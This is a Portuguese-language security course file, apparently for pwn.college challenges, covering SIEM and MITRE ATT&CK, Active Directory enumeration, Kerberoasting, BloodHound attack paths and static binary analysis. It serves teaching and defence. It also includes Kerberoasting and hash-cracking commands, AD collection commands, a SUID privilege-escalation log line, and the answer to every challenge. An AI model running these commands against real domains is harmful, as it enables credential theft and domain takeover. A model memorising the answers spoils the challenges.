      ### 📖 Introdução Teórica

      No ecossistema moderno de defesa cibernética (Blue Team e SOC - *Security Operations Center*), a detecção de ameaças não se limita à análise isolada de eventos. Um único login com falha é um ruído corriqueiro de rede; no entanto, cinquenta logins falhados seguidos de um login bem-sucedido via conta de serviço e o agendamento imediato de uma tarefa no Cron representam um incidente crítico de intrusão e movimentação lateral. A capacidade de conectar esses pontos é a essência do **SIEM** e do **Mapeamento Tático MITRE ATT&CK**.

      #### A Engenharia de um SIEM (Security Information and Event Management)
      O SIEM é a plataforma centralizadora de inteligência defensiva que processa fluxos contínuos de telemetria através de três etapas sequenciais:
      1. **Ingestão e Normalização (Parsing):** Coletores (como Elastic Agent, Fluentbit ou Splunk Forwarder) capturam logs brutos de roteadores, firewalls, daemons Linux (`sshd`, `auditd`) e controladores de domínio. Esses dados heterogêneos são normalizados em padrões abertos como o **ECS** (*Elastic Common Schema*) ou o **CIM** (*Common Information Model*), padronizando nomes de campos (ex: `source.ip`, `user.name`, `event.action`).
      2. **Motores de Correlação:** Aplicam lógicas temporais e relacionais entre fontes distintas para identificar cadeias complexas de ataque (ex: *Eventos A, B e C ocorrendo dentro de uma janela de 5 minutos com a mesma origem*).
      3. **Triagem e Alerta:** Notificam os analistas do SOC com contexto enriquecido e nível de severidade calibrado.

      ```
      +-----------------------------------------------------------------------------------------+
      |                                    MITRE ATT&CK MATRIX                                  |
      +-------------------+-------------------+------------------------+------------------------+
      | INITIAL ACCESS    | PERSISTENCE       | PRIVILEGE ESCALATION   | DEFENSE EVASION        |
      +-------------------+-------------------+------------------------+------------------------+
      | T1078             | T1053.003         | T1548.001              | T1070.004              |
      | Valid Accounts    | Cron / Scheduled  | Setuid / SUID Abuse    | File Deletion          |
      | (svc_backup)      | (Retorno furtivo) | (Escalação para root)  | (Apaga vestígios)      |
      +-------------------+-------------------+------------------------+------------------------+
      ```

      #### A Taxonomia MITRE ATT&CK
      O framework **MITRE ATT&CK** (*Adversarial Tactics, Techniques, and Common Knowledge*) é a base pública global que cataloga os comportamentos reais observados em ataques de adversários e grupos de espionagem cibernética (APTs). Ele organiza as ações em dois níveis indispensáveis:
      * **Táticas (Tactics):** O objetivo tático do invasor em cada fase da campanha (*"O que o adversário quer alcançar?"*). Exemplos: *Initial Access*, *Persistence*, *Privilege Escalation*, *Defense Evasion*, *Credential Access*.
      * **Técnicas e Subtécnicas (Techniques):** O método técnico específico utilizado para atingir o objetivo (*"Como ele executa a ação?"*). Cada técnica possui um identificador canônico (ex: `T1053.003` para Cron no Linux).

      Ao etiquetar cada regra do SIEM com o ID correspondente da matriz ATT&CK, o SOC quantifica com precisão sua cobertura defensiva e identifica pontos cegos na infraestrutura.

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A investigação prática de incidentes em ambiente Linux combina ferramentas de correlação de linha de comando com regras estruturadas de detecção:

      #### 1. Filtrando Eventos Relevantes no Linux (`auth.log` e `auditd`)
      ```bash
      # Investigar sequências de falhas seguidas de sucessos no serviço SSH:
      grep -E "(Failed password|Accepted publickey)" /var/log/auth.log

      # Buscar comandos privilegiados registrados pelo framework de auditoria auditd:
      ausearch -m EXECVE -ts today

      # Gerar resumo estatístico das execuções suspeitas:
      aureport -x --summary
      ```

      #### 2. Amostra de Telemetria Correlacionada (`/tmp/cyberguard_auth_audit.log`)
      ```text
      Oct 26 03:14:10 sec-srv-01 sshd[1204]: Failed password for invalid user admin from 192.168.1.100 port 49152 ssh2
      Oct 26 03:14:15 sec-srv-01 sshd[1205]: Failed password for invalid user admin from 192.168.1.100 port 49154 ssh2
      Oct 26 03:15:02 sec-srv-01 sshd[1210]: Accepted publickey for svc_backup from 192.168.1.100 port 49160 ssh2: ED25519 SHA256:7uX9a...
      Oct 26 03:16:00 sec-srv-01 CRON[1250]: (root) CMD (cp /bin/bash /tmp/.pwned && chmod +s /tmp/.pwned)
      Oct 26 03:16:45 sec-srv-01 auditd[900]: type=EXECVE msg=audit(1698300000.120:45): argc=3 a0="/bin/sh" a1="-c" a2="cat /flag"
      ```

      #### 3. Especificação de Regra de Detecção SIEM (Sigma Rule)
      ```yaml
      title: Escalacao de Privilegio via Cron e SUID Apos Login Suspeito
      status: production
      description: Detecta criacao de binario setuid disparado via tarefa Cron logo apos autenticacao
      logsource:
        product: linux
        service: syslog
      detection:
        condition: selection_cron and selection_suid
        selection_cron:
          process.name: 'cron'
        selection_suid:
          process.command_line|contains: 'chmod +s'
      tags:
        - attack.persistence
        - attack.t1053.003
        - attack.privilege_escalation
        - attack.t1548.001
      ```

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga os passos abaixo para analisar os logs e responder ao desafio:

      1. **Inicie o desafio de correlação de logs:**
         Execute `/challenge/dfir-log-correlation-mitre` no terminal:
         ```bash
         /challenge/dfir-log-correlation-mitre
         ```
         *O simulador criará o arquivo `/tmp/cyberguard_auth_audit.log`.*

      2. **Analise o histórico de eventos:**
         Examine o conteúdo do arquivo gerado para reconstruir a cadeia do ataque:
         ```bash
         cat /tmp/cyberguard_auth_audit.log
         ```
         *Identifique o encadeamento:*
         - Falhas consecutivas de senha originadas de `192.168.1.100`.
         - Sucesso de autenticação via chave pública para a conta `svc_backup`.
         - Execução via Cron de cópia do `/bin/bash` com atribuição de bit SUID (`chmod +s /tmp/.pwned`).
         - Leitura privilegiada da `/flag`.

      3. **Avalie a pergunta conceitual:**
         O binário apresentará a seguinte questão:
         > *"O que é a matriz MITRE ATT&CK e para que serve na operação do Blue Team?"*
         * 1) Um software antivírus open-source para bloqueio de malware em endpoints
         * **2) Uma base de conhecimento global de táticas e técnicas adversárias utilizada para orientar regras de detecção, mapear campanhas e organizar a telemetria**
         * 3) Uma linguagem de programação exclusiva para desenvolvimento de exploits
         * 4) Um protocolo de rede proprietário para transporte de logs cifrados

      4. **Selecione a resposta correta:**
         Digite **`2`** no prompt interativo e pressione Enter.
         *Ou execute passando diretamente o parâmetro:*
         ```bash
         /challenge/dfir-log-correlation-mitre 2
         ```

      5. **Capture a flag:**
         O sistema validará o mapeamento conceitual e emitirá a flag de conclusão:
         ```text
         [+] DEBRIEFING TÉCNICO: MAPEAMENTO MITRE ATT&CK CONSOLIDADO!
         [FLAG DE VALIDAÇÃO CYBERGUARD]:
         pwn.college{...}
         ```
         Copie a flag no formato `pwn.college{...}` para pontuar no painel.
- id: active-directory-infra
  name: 'Módulo 7: Infraestrutura Corporativa & Active Directory'
  description: |
    O Active Directory (AD) da Microsoft gerencia identidades, acessos e permissões em mais de 90% das redes corporativas globais. Este módulo introduz a arquitetura de Domínio Windows, o papel central dos Domain Controllers (DC), os protocolos LDAP/Kerberos e os vetores de ataque mais prevalentes no ecossistema de redes empresariais.

    Será explorada em detalhes a técnica de Kerberoasting, ensinando como contas com Service Principal Names (SPN) podem ser requisitadas e quebradas offline sem privilégios administrativos.
  resources:
  - name: Active Directory Attacks & Defenses
    type: lecture
    video: https://www.youtube.com/watch?v=kY3s4BDhhq8
    slides: https://pwn.college/infrastructure
  - name: 'Guia Teórico: Arquitetura de Domínio, Kerberos e Kerberoasting'
    type: markdown
    content: "### Arquitetura de Domínio e o Domain Controller (DC)\n\nO **Domain Controller (DC)** é o servidor que centraliza\
      \ a base de dados do Active Directory (`ntds.dit`) e autentica todos os usuários, computadores e serviços em um ambiente\
      \ corporativo através do protocolo **Kerberos**.\n\n### O Mecanismo do Kerberoasting\nO Kerberoasting é um ataque de\
      \ extração de credenciais que não requer privilégios elevados no domínio — qualquer conta de usuário comum válida pode\
      \ executá-lo:\n\n```\n1. Atacante autenticado no domínio pesquisa contas de serviço que possuem \n   um Service Principal\
      \ Name (SPN) configurado via LDAP.\n   \n2. O atacante solicita ao Domain Controller (KDC) um Ticket Granting Service\
      \ (TGS) \n   para esse SPN específico (ex: MSSQLSvc/db01.corp.local).\n   \n3. O Domain Controller emite o bilhete TGS\
      \ criptografado com o hash da senha \n   da conta de serviço associada.\n   \n4. O atacante extrai o bilhete TGS da\
      \ memória local de sua máquina e inicia um ataque \n   de força bruta offline (com Hashcat modo 13100 ou John the Ripper).\n\
      \   \n5. Como a senha da conta de serviço é frequentemente fraca e não expira, o atacante \n   recupera a senha em texto\
      \ claro sem gerar alertas de bloqueio no DC!\n```\n\n#### Mitigação de Kerberoasting:\n* Utilizar contas de serviço\
      \ gerenciadas por grupo (**gMSA - Group Managed Service Accounts**), cujas senhas possuem 128 caracteres aleatórios\
      \ e são rotacionadas automaticamente pelo Windows.\n* Garantir que contas tradicionais de serviço possuam senhas de\
      \ complexidade extrema (> 25 caracteres).\n"
  challenges:
  - id: ad-ldap-enumeration
    name: Enumeração de Objetos via LDAP
    description: |
      ### 📖 Introdução Teórica
      Em mais de 90% das redes corporativas de grande e médio porte no mundo, a gestão de identidades, autenticações e permissões é unificada pelo **Active Directory Domain Services (AD DS)** da Microsoft.

      **O Papel Central do Domain Controller (DC):**
      O **Domain Controller (DC)** é o servidor mais crítico de toda a infraestrutura corporativa. Ele não é um mero comutador ou roteador de rede. O DC é a **âncora de segurança e autoridade primária do domínio**:
      1. **Autenticação Centralizada:** Valida a identidade de cada colaborador, computador e serviço da organização através de protocolos como Kerberos v5 e NTLM.
      2. **A Base de Dados Mestra (`NTDS.dit`):** O DC armazena e gerencia o arquivo `C:\Windows\NTDS\NTDS.dit`. Essa base de dados contém todos os objetos do domínio corporativo: contas de usuários, grupos de segurança, computadores, relações de confiança e, mais criticamente, **os hashes de senha (NTLM) e segredos Kerberos de todas as contas corporativas**, incluindo o administrador do domínio (`Domain Admins`) e a conta `krbtgt` (responsável pela criptografia de tickets TGT).
      3. **Distribuição de Políticas (GPOs):** Aplica políticas de segurança uniformes em milhares de estações de trabalho e servidores com um único clique.
      4. **Serviços Essenciais de Suporte:** Opera o Key Distribution Center (KDC Kerberos na porta 88), servidores de nomes DNS (porta 53) e catálogo de diretório LDAP (portas 389 e 636).

      **O Protocolo LDAP (Lightweight Directory Access Protocol):**
      O LDAP é o protocolo padrão da indústria utilizado para consultar e manipular objetos dentro da árvore do Active Directory.
      * **Por que a enumeração LDAP é o primeiro passo de qualquer atacante ou auditor?**
        Ao obter acesso a qualquer máquina conectada ao domínio (ou em cenários com consultas anônimas / *null bind* permitidas), o atacante utiliza o LDAP para mapear toda a topologia corporativa:
        - Identificar contas com privilégios administrativos (`adminCount=1`).
        - Localizar contas de serviço que possuem Service Principal Names (SPNs) configurados (alvos diretos de *Kerberoasting*).
        - Encontrar contas sem exigência de pré-autenticação Kerberos (alvos de *AS-REP Roasting*).
        - Descobrir estações com sistemas operacionais obsoletos e grupos delegados de HelpDesk.

      Na segurança defensiva (Blue Team), a proteção do Domain Controller é classificada como **Tier 0** (nível de isolamento máximo). Se um adversário obtiver credenciais de um DC ou replicar a base `NTDS.dit` via técnica de `DCSync` (`secretsdump.py`), toda a empresa estará irremediavelmente comprometida.

      ### 💻 Exemplos Práticos e Sintaxe
      Consultas LDAP essenciais no terminal Linux utilizando `ldapsearch`:

      1. **Conexão básica e enumeração da raiz do domínio (`-x` para bind simples):**
         ```bash
         ldapsearch -x -H ldap://dc01.corp.cyberguard.local      -b "DC=corp,DC=cyberguard,DC=local"      "(objectClass=organizationalPerson)" sAMAccountName mail
         ```

      2. **Filtrar contas de serviço que possuem SPN (Alvos de Kerberoasting):**
         ```bash
         ldapsearch -x -H ldap://dc01.corp.cyberguard.local      -b "DC=corp,DC=cyberguard,DC=local"      "(&(objectClass=user)(servicePrincipalName=*))"      sAMAccountName servicePrincipalName
         ```
         *Saída esperada:*
         ```text
         # srv_sql, Users, corp.cyberguard.local
         dn: CN=srv_sql,CN=Users,DC=corp,DC=cyberguard,DC=local
         sAMAccountName: srv_sql
         servicePrincipalName: MSSQLSvc/sql01.corp.cyberguard.local:1433
         ```

      3. **Filtrar usuários com flag de privilégio administrativo (`adminCount=1`):**
         ```bash
         ldapsearch -x -H ldap://dc01.corp.cyberguard.local      -b "DC=corp,DC=cyberguard,DC=local"      "(&(objectCategory=person)(adminCount=1))"      sAMAccountName memberOf
         ```

      4. **Filtrar contas vulneráveis a AS-REP Roasting (bit DONT_REQ_PREAUTH):**
         ```bash
         ldapsearch -x -H ldap://dc01.corp.cyberguard.local      -b "DC=corp,DC=cyberguard,DC=local"      "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"      sAMAccountName
         ```

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)
      1. **Localizar e Iniciar o Binário:**
         No terminal do container, execute o desafio de governança e infraestrutura Active Directory:
         ```bash
         /challenge/ad-ldap-enumeration
         ```
      2. **Analisar a Pergunta do Laboratório:**
         O programa exibirá a questão técnica fundamental sobre a arquitetura corporativa:
         "Qual é a função primordial de um Domain Controller (DC) no Active Directory?"
         Opções:
         * `[A]` Funcionar meramente como um roteador de pacotes TCP e comutador de nível 3
         * `[B]` Autenticar usuários/serviços e centralizar a base mestra de segurança do domínio (NTDS.dit)
         * `[C]` Substituir switches de borda e acelerar conexões Wi-Fi sem criptografia
         * `[D]` Converter endereços IPv4 em IPv6 através de NAT de camada de enlace
      3. **Submeter a Resposta Correta:**
         No prompt interativo `[A/B/C/D]`, selecione a opção **B**:
         ```text
         B
         ```
         *(Ou execute diretamente com argumento CLI: `/challenge/ad-ldap-enumeration B`).*
      4. **Capturar e Submeter a Flag:**
         O binário confirmará a resposta, apresentará o debriefing sobre a centralidade do banco `NTDS.dit` e imprimirá a flag no formato:
         ```text
         pwn.college{...}
         ```
         Copie a flag e submeta-a no painel do dojo.
  - id: ad-kerberoasting-offline
    name: Identificação de SPNs e Ataque Kerberoasting
    description: |
      ### 📖 Introdução Teórica
      O **Kerberoasting** (catalogado na matriz MITRE ATT&CK como técnica **T1558.003**) é um dos ataques de escalação de privilégios e movimentação lateral mais prevalentes e perigosos no ecossistema do Microsoft Active Directory.

      **O Protocolo Kerberos v5 e a Concessão de Bilhetes:**
      Para permitir que colaboradores acessem serviços corporativos (como instâncias Microsoft SQL Server, portais intranet IIS ou compartilhamentos de arquivos) sem transmitir senhas pela rede, o Active Directory utiliza bilhetes criptográficos:
      1. O usuário se autentica com sua senha no Key Distribution Center (KDC) do Domain Controller e recebe um Ticket Granting Ticket (TGT).
      2. Quando o usuário deseja interagir com um serviço de rede, ele envia uma solicitação de bilhete de serviço (**TGS-REQ**) ao KDC informando o **Service Principal Name (SPN)** do alvo (ex: `MSSQLSvc/sql01.corp.local:1433`).
      3. O KDC responde (**TGS-REP**) fornecendo o bilhete **Ticket Granting Service (TGS)**.

      **A Falha Estrutural e a Superfície de Abuso:**
      * **Qualquer usuário válido do domínio**, mesmo a conta mais humilde e restrita (como um estagiário ou terceiro temporário), tem autorização pelo protocolo para solicitar um bilhete TGS para **QUALQUER conta de serviço** que tenha um SPN registrado.
      * O KDC **não verifica** se o usuário possui permissão real para usar aquele serviço antes de emitir o bilhete!
      * O bilhete TGS retornado é **criptografado utilizando o hash NTLM da conta de usuário do Active Directory que executa o serviço**.

      **Por que o Ataque é 100% Offline e Furtivo?**
      O atacante **não precisa se conectar ao servidor do serviço real**:
      * O bilhete TGS chega na memória da máquina do atacante.
      * O atacante extrai o ticket cifrado e o submete a um ataque de dicionário ou força bruta **totalmente offline** em seu próprio computador (utilizando Hashcat com GPUs ou John the Ripper).
      * **Nenhum log de bloqueio de conta (`badPwdCount`) é gerado no Domain Controller**, pois o DC nunca sabe que bilhões de senhas estão sendo testadas localmente contra o ticket!
      * Como contas de serviço frequentemente usam senhas fracas que nunca expiram (para evitar a interrupção de sistemas legados), a senha em texto claro é descoberta rapidamente.

      **Mitigações Canônicas:**
      * Adoção mandatória de **Contas de Serviço Gerenciadas por Grupo (gMSA - Group Managed Service Accounts)**: suas senhas possuem 128 caracteres aleatórios e são rotacionadas automaticamente pelo Windows, tornando o cracking offline matematicamente impossível.
      * Para contas legadas que não suportam gMSA, exigir senhas com comprimento superior a 25 caracteres aleatórios e monitorar requisições em massa de TGS com cifra RC4 (Event ID 4769).

      ### 💻 Exemplos Práticos e Sintaxe
      1. **Requisitar Bilhetes TGS no Linux com a suíte Impacket (`GetUserSPNs.py`):**
         ```bash
         # Requisita tickets TGS de todas as contas com SPN e salva em formato do Hashcat/John:
         GetUserSPNs.py corp.local/usuario_comum:Senha123      -dc-ip 10.10.10.1 -request -outputfile tgs_hashes.txt
         ```

      2. **Formato do Hash TGS Extraído (Kerberos 5 etype 23):**
         ```text
         $krb5tgs$23$*srv_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local:1433*$1a2b3c4d5e...
         ```

      3. **Quebra Offline com Hashcat (Modo 13100):**
         ```bash
         hashcat -m 13100 -a 0 tgs_hashes.txt /usr/share/wordlists/rockyou.txt
         ```
         *A flag `-m 13100` instrui o Hashcat a decodificar tickets Kerberos 5 TGS-REP.*

      4. **Quebra Offline com John the Ripper:**
         ```bash
         john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt tgs_hashes.txt
         john --show --format=krb5tgs tgs_hashes.txt
         ```

      5. **Requisitar Tickets no Windows com Rubeus:**
         ```powershell
         .\Rubeus.exe kerberoast /outfile:tgs_hashes.txt
         ```

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)
      1. **Localizar e Iniciar o Binário:**
         No terminal do container, execute o desafio de Kerberoasting:
         ```bash
         /challenge/ad-kerberoasting-offline
         ```
      2. **Analisar a Pergunta Conceitual:**
         O programa exibirá a questão técnica sobre o mecanismo operacional do ataque:
         "Como é caracterizado tecnicamente o ataque conhecido como Kerberoasting?"
         Opções:
         * `[1]` Esgotamento de pacotes SYN contra a porta UDP 53 do servidor DNS do domínio
         * `[2]` Solicitar tickets de serviço (TGS) de contas com SPN ao KDC e quebrar o hash da senha offline
         * `[3]` Injeção de código SQL em estações de trabalho de usuários comuns sem rede
         * `[4]` Interceptar o tráfego físico Wi-Fi para clonar o endereço MAC do switch core
      3. **Submeter a Opção Correta:**
         No prompt do desafio `[1/2/3/4]`, insira a opção **2**:
         ```text
         2
         ```
         *(Ou invoque diretamente com argumento: `/challenge/ad-kerberoasting-offline 2`).*
      4. **Capturar e Submeter a Flag:**
         O programa validará a resposta, fornecerá o debriefing operacional sobre segurança de contas de serviço e exibirá a flag no formato:
         ```text
         pwn.college{...}
         ```
         Copie a flag e registre a pontuação no portal.
  - id: ad-bloodhound-path
    name: Mapeamento de Rotas de Ataque com BloodHound
    description: |
      ### 📖 Introdução Teórica
      Nas palavras clássicas de John Lambert (arquiteto distinto de segurança da Microsoft):
      > *"Defenders think in lists. Attackers think in graphs. As long as this is true, attackers win."*

      Em redes empresariais tradicionais, as equipes de defesa tendem a auditar listas de controle estáticas e isoladas (por exemplo: *"Quem são os usuários listados no grupo Domain Admins?"*). Se essa lista contiver apenas três contas conhecidas, o administrador assume falsamente que o domínio está seguro.
      No entanto, invasores pensam em **grafos de relacionamentos e permissões transitivas**.

      **Como Permissões Transitivas Criam Caminhos Invisíveis de Escalação:**
      Ao longo de anos de operação de TI em uma empresa, centenas de permissões pontuais e delegações são concedidas para atender demandas temporárias (chamados de suporte, integrações de sistemas, scripts legados). Quando essas permissões individuais se encadeiam, elas formam pontes que permitem a qualquer colaborador comum assumir o controle total do domínio (*Domain Compromise Path*).

      **O Ecossistema BloodHound:**
      O **BloodHound** é uma ferramenta de código aberto que utiliza a teoria dos grafos para mapear relações ocultas de controle de acesso dentro de um Active Directory:
      1. **Coletores / Ingestors (SharpHound / BloodHound.py):** Executam milhares de consultas LDAP, chamadas MSRPC/SAMR e enumerações de sessões SMB na rede, gerando arquivos JSON com todos os nós e permissões.
      2. **Banco de Dados em Grafo (Neo4j):** Modela os dados em nós (usuários, grupos, computadores, OUs) e arestas direcionadas (*edges*, representando privilégios e associações).
      3. **Interface Visual (BloodHound GUI):** Permite calcular rotas mais curtas (*shortest paths*) até grupos de alto privilégio como `Domain Admins`.

      **Dicionário das Principais Arestas (Edges) no BloodHound:**
      * **`MemberOf`:** O nó pertence a um grupo e herda todos os direitos daquele grupo.
      * **`GenericAll`:** Controle total e irrestrito sobre o objeto de destino (permite redefinir a senha do usuário, modificar seus atributos ou adicioná-lo a novos grupos).
      * **`WriteDacl`:** Direito de reescrever a lista de controle de acesso discricionário (DACL) do objeto alvo, permitindo ao atacante conceder a si próprio permissão de `GenericAll`.
      * **`WriteOwner`:** Permite tomar posse da propriedade do objeto e subsequentemente alterar suas permissões.
      * **`ForceChangePassword`:** Permite trocar a senha da conta de destino sem precisar conhecer a senha atual.
      * **`AdminTo`:** Usuário tem privilégio de Administrador Local sobre a estação ou servidor.

      **Análise da Cadeia de Ataque deste Desafio:**
      Considere a rota extraída pelo BloodHound:
      ```
      [User: bob] ──(MemberOf)──> [Group: HelpDesk] ──(GenericAll)──> [User: srv_backup] ──(WriteDacl)──> [Group: Domain Admins]
      ```
      1. O usuário comum **`bob`** pertence ao grupo **`HelpDesk`**.
      2. O grupo `HelpDesk` possui permissão total (**`GenericAll`**) sobre a conta de serviço **`srv_backup`**. Bob utiliza esse direito para redefinir a senha de `srv_backup`.
      3. A conta `srv_backup` possui a permissão **`WriteDacl`** sobre o grupo restrito **`Domain Admins`**. Bob utiliza a conta `srv_backup` para alterar a lista de acesso do grupo e adicionar seu próprio usuário (`bob`) aos administradores do domínio.
      4. Escalação concluída com sucesso: o ponto de partida de toda a cadeia é o usuário **`bob`**.

      ### 💻 Exemplos Práticos e Sintaxe
      1. **Coleta de Dados em Campo com SharpHound (Windows PowerShell):**
         ```powershell
         .\SharpHound.exe --CollectionMethods All --Domain corp.cyberguard.local --ZipFileName ad_coleta.zip
         ```

      2. **Coleta de Dados no Linux com `bloodhound-python`:**
         ```bash
         bloodhound-python -u bob -p "Senha123" -d corp.cyberguard.local \
           -dc dc01.corp.cyberguard.local -c All --zip
         ```

      3. **Consultas em Linguagem Cypher no Neo4j (Interface do BloodHound):**
         * *Encontrar o caminho mais curto de qualquer usuário comum até Domain Admins:*
           ```cypher
           MATCH (u:User {admincount: 0}), (g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"}),
                 p = shortestPath((u)-[*1..]->(g))
           RETURN p
           ```
         * *Localizar todos os membros de grupos com permissão WriteDacl em Domain Admins:*
           ```cypher
           MATCH p=(m)-[:WriteDacl]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
           RETURN p
           ```

      4. **Defesa Estrutural: Modelo de Camadas Administrativas (Enterprise Tiering):**
         A Microsoft recomenda o isolamento estrito de ativos:
         * **Tier 0:** Domain Controllers, contas de Domain Admins e servidores PKI. Contas de Tier inferior (HelpDesk, estações comuns) jamais podem ter qualquer direito de escrita ou acesso sobre objetos de Tier 0.

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)
      1. **Localizar e Iniciar o Binário:**
         No terminal do container, execute o desafio de análise de grafos:
         ```bash
         /challenge/ad-bloodhound-path
         ```
      2. **Examinar o Grafo Exibido no Terminal:**
         O programa exibirá a rota de permissões transitivas mapeada:
         ```text
         [User: bob] -> MemberOf -> [Group: HelpDesk] -> GenericAll -> [User: srv_backup] -> WriteDacl -> [Group: Domain Admins]
         ```
         E fará a pergunta:
         "Qual é o usuário comum inicial que pode explorar essa cadeia transitiva de permissões para escalar privilégios até o grupo 'Domain Admins'?"
      3. **Identificar e Submeter o Usuário Inicial:**
         No prompt interativo `>> `, digite o identificador da conta de origem:
         ```text
         bob
         ```
         *(Ou execute diretamente via CLI: `/challenge/ad-bloodhound-path bob`).*
      4. **Capturar e Submeter a Flag:**
         O binário confirmará a análise correta da rota do BloodHound e exibirá a flag no formato:
         ```text
         pwn.college{...}
         ```
         Copie a flag e registre a pontuação no portal.
- id: engenharia-reversa-x86
  name: 'Módulo 8: Engenharia Reversa x86/x64 & Arquitetura de CPU'
  description: |
    O divisor de águas entre analistas teóricos e verdadeiros especialistas técnicos é o domínio da arquitetura de computadores e da linguagem Assembly x86_64. Este módulo ataca diretamente o maior gap identificado no diagnóstico: a compreensão do ciclo de execução da CPU e o papel crucial de registradores como RIP/EIP, RSP/ESP e RBP/EBP.

    Você aprenderá a diferenciar Análise Estática (leitura de código com Ghidra, objdump, strings) de Análise Dinâmica (depuração interativa com GDB/GEF e rastreamento de runtime), decodificando estruturas condicionais, laços de repetição e convenções de chamada em assembly.
  resources:
  - name: 'Assembly Crash Course: Registradores e Instruções x86_64'
    type: lecture
    video: https://www.youtube.com/watch?v=rshj6Wsmrk4
    slides: https://pwn.college/assembly-crash-course
  - name: 'Guia Teórico: Mapa de Registradores x86_64, RIP vs EFLAGS e Análise Estática/Dinâmica'
    type: markdown
    content: |
      ### Registradores da Arquitetura x86_64

      A CPU executa instruções sequenciais na memória orientada por registradores dedicados:

      #### 1. Registrador de Instrução: RIP (Instruction Pointer / EIP em 32-bit)
      * **O que é:** O registrador mais importante para controle de fluxo.
      * **Função Exclusiva:** **Aponta para o endereço de memória da PRÓXIMA instrução que será executada pela CPU**.
      * *Atenção Crítica:* EIP/RIP **NÃO armazena o resultado de comparações lógicas** (quem faz isso é o registrador `EFLAGS/RFLAGS`). Controlar o valor de RIP significa desviar a execução do programa para onde o atacante desejar!

      #### 2. Registradores de Pilha (Stack):
      * **`RSP` (Stack Pointer / ESP em 32-bit):** Aponta para o topo atual da pilha de execução. Cresce em direção a endereços menores de memória.
      * **`RBP` (Base Pointer / EBP em 32-bit):** Aponta para a base do quadro de pilha atual (*stack frame*), servindo de âncora fixa para acessar variáveis locais e argumentos.

      #### 3. Registradores de Uso Geral:
      * `RAX`: Acumulador; comumente utilizado para armazenar o valor de retorno de funções e número da syscall.
      * `RBX`: Registrador base.
      * `RCX`: Contador em laços de repetição (`loop`).
      * `RDX`: Dados e operações aritméticas.
      * `RDI`, `RSI`, `RDX`, `RCX`, `R8`, `R9`: Registradores usados na convenção System V AMD64 para passar os primeiros 6 argumentos para funções em C.

      ### Análise Estática vs Análise Dinâmica
      * **Análise Estática:** Exame do binário **sem executá-lo**. Inspeciona-se o cabeçalho ELF/PE, seções de código descompiladas no Ghidra/IDA Pro, cadeias de texto (`strings`), chamadas a bibliotecas e fluxo de controle estático. Vantagem: seguro para malware; Desvantagem: difícil de resolver código ofuscado ou empacotado.
      * **Análise Dinâmica:** Observação do comportamento do programa **durante sua execução ativa** em um ambiente isolado (sandbox ou GDB). Monitora-se a memória em tempo real, registradores, chamadas de sistema (`strace`) e valores de variáveis em breakpoints.
  challenges:
  - id: rev-static-strings-objdump
    name: Análise Estática Fundamental (Strings & Objdump)
    description: |-
      ### 📖 Introdução Teórica

      A Engenharia Reversa de software é a disciplina dedicada a desconstruir um artefato compilado para compreender seus algoritmos internos, desvendar mecanismos de proteção ou identificar vulnerabilidades sem ter acesso prévio ao código-fonte original. No fluxo de análise de binários, o primeiro e mais seguro passo metodológico é a **Análise Estática**.

      #### O que é Análise Estática e por que ela é Segura?
      A Análise Estática consiste em examinar as estruturas internas, metadados, seções e instruções de máquina de um executável **sem colocá-lo em execução no processador**.
      * **Segurança Absoluta:** Ao receber um artefato suspeito (como um ransomware, trojan bancário ou wiper), executá-lo diretamente pode causar a destruição irreversível do laboratório. A análise estática trata o binário puramente como uma sequência passiva de bytes em disco, eliminando qualquer risco de infecção acidental.
      * **Visibilidade Integral:** Ferramentas de desmonte estático permitem visualizar 100% dos blocos de código e rotinas do programa — incluindo funções de depuração, backdoors e branches de erro que jamais seriam acionadas durante uma execução convencional.

      ```
      +-----------------------------------------------------------------------------------------+
      |                                ESTRUTURA DO FORMATO ELF                                 |
      |                         (Executable and Linkable Format - Linux)                        |
      +-----------------------------------------------------------------------------------------+
      | CABEÇALHO ELF: Magic Bytes 7F 45 4C 46 ("\x7fELF"), Arquitetura (x86_64), Entry Point   |
      +-------------+---------------------------------------------------------------------------+
      | SEÇÃO .text | Instruções de máquina executáveis (código assembly gerado pelo compilador)|
      +-------------+---------------------------------------------------------------------------+
      | SEÇÃO       | Read-Only Data (Dados Somente Leitura):                                   |
      | .rodata     | - Strings literais de texto ("Digite sua senha: ")                        |
      |             | - Chaves criptográficas e tokens hardcoded ("REVERSE_STATIC_KEY_...")     |
      +-------------+---------------------------------------------------------------------------+
      | SEÇÃO .data | Variáveis globais e estáticas com valores iniciais definidos              |
      +-------------+---------------------------------------------------------------------------+
      | SEÇÃO .bss  | Variáveis não inicializadas (zeradas em memória no momento do carregamento|
      +-----------------------------------------------------------------------------------------+
      ```

      #### A Seção `.rodata` e o Erro das Chaves Hardcoded
      Em programas escritos em C/C++, qualquer texto delimitado por aspas duplas (como `"senha_secreta"`) é posicionado pelo compilador diretamente na seção `.rodata` (*Read-Only Data*). Quando desenvolvedores negligentes incorporam segredos estáticos diretamente no código (*hardcoding*), esses artefatos ficam gravados em texto claro no arquivo executável, permitindo que qualquer analista os extraia em segundos com ferramentas elementares de linha de comando.

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A caixa de ferramentas fundamental da análise estática no Linux é composta por utilitários da suíte GNU Binutils:

      #### 1. Identificação do Tipo de Binário (`file`)
      O utilitário `file` examina os magic bytes no cabeçalho do arquivo para identificar sua arquitetura de CPU, se é de 32 ou 64 bits, e se os símbolos de depuração foram removidos (*stripped*):
      ```bash
      file /tmp/malware_sample.elf
      ```
      *Saída típica:*
      ```text
      /tmp/malware_sample.elf: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
      ```

      #### 2. Extração de Strings Imprimíveis (`strings`)
      O comando `strings` varre o arquivo em busca de sequências de 4 ou mais caracteres ASCII imprimíveis consecutivos terminados por byte nulo:
      ```bash
      # Extrair todas as strings de todas as seções e filtrar por padrão:
      strings -a /tmp/malware_sample.elf | grep REVERSE

      # Exibir as strings acompanhadas de seu deslocamento (offset) em hexadecimal:
      strings -t x /tmp/malware_sample.elf
      ```

